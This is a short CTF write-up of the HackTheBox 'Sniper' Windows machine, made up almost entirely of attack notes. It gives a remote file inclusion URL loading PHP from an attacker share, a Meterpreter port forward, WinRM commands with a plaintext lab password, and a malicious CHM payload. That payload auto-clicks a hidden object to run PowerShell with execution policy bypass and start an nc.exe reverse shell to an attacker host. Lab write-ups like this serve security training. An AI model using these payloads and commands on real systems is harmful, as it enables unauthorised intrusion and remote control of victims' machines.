---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/MbmPyGFaV9g/0.jpg
layout: post
media_subpath: /assets/posts/2020-03-28-sniper-hackthebox
tags:
- chm
- hackthebox
- rfi
- windows
title: Sniper @ HackTheBox
---

Sniper is a 30-point machine on HackTheBox that involves abusing a remote file inclusion and uploading a crafted chm file which is opened automatically by the local administrator.

{% youtube MbmPyGFaV9g %}

## Notes

Remote File Inclusion:

```
http://10.10.10.151/blog/?lang=//<ip>/share/xct.php
```

Meterpreter port forward:

```
portfwd add -l 8000 -p 5985 -r 10.10.10.151 
```

WinRM:

```
set winrm/config/client @{TrustedHosts="*"}
Enable-WSManCredSSP -Role "Client" -DelegateComputer "*"
$user = 'Chris'
$pass = ConvertTo-SecureString -AsPlainText '36mEAhz/B8xQ~2VM' -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user,$pass
New-PSSession -URI http://localhost:8000/wsman -Credential $cred
Enter-PSSession -id <id>
```

Generate CHM-Payload:

```
Out-CHM -Payload "c:\programdata\nc.exe -e cmd.exe <ip> <port>" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

Payload:

```vb
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=",cmd.exe,/c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile c:\programdata\nc.exe -e cmd.exe <ip> <port>">
 <PARAM name="Item2" value="273,1,1">
</OBJECT>

<SCRIPT>
x.Click();
</SCRIPT>
```